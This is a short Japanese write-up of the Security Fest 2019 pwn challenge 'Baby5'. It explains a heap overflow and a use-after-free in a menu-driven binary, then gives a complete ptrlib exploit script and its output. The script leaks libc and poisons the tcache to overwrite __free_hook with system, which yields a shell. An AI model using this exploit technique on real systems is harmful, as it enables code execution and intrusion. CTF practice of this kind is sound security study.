# [pwn 359pts] Baby5 - Security Fest 2019
64ビットでSSPが有効です。
```
$ checksec -f baby5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		2	baby5
```

add, edit, show, deleteがあるシンプルなヒープ系問題ですね。

addではサイズを指定してmallocできます。
mallocされたアドレスはグローバル変数listに追加され、dataをsizeバイトだけreadできます。

editではindexを入力し、list[index]が空でなければサイズを指定してreadできます。
この際新しいサイズが元よりも小さいかをチェックしていないのでヒープオーバーフローがあります。

deleteではindexを入力し、list[index]が空でなければfreeします。
この際listにNULLを代入していないのでUAFがあります。

showではindexを入力し、list[index]が空でなければ内容をputsします。

libcのバージョンは2.27なのでtcacheが有効で、シンプルにTCache Poisoningで解けそうです。

```python
from ptrlib import *

def add(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def edit(index, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("item: ")
    sock.sendline(str(index))
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def delete(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("item: ")
    sock.sendline(str(index))

def show(index):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("item: ")
    sock.sendline(str(index))
    sock.recvuntil("data: ")
    return sock.recvline().rstrip()

libc = ELF("./libc.so.6")
sock = Process("./baby5")
main_arena = 0x3ebc40
delta = 0x60

# leak libc base
add(0x500, "A")
add(0x18, "B")
add(0x8, "/bin/sh\x00")
delete(0)
libc_base = u64(show(0)) - main_arena - delta
dump("libc base = " + hex(libc_base))

# tcache poisoning
delete(1)
delete(1)
add(0x18, p64(libc_base + libc.symbol("__free_hook")))
add(0x18, "C")
add(0x18, p64(libc_base + libc.symbol("system")))

# get the shell
delete(2)

sock.interactive()
```

一発で通ったぜ。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=14607)
[ptrlib] libc base = 0x7f783dea4000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
10分で解けた。肉じゃが作るより早い。
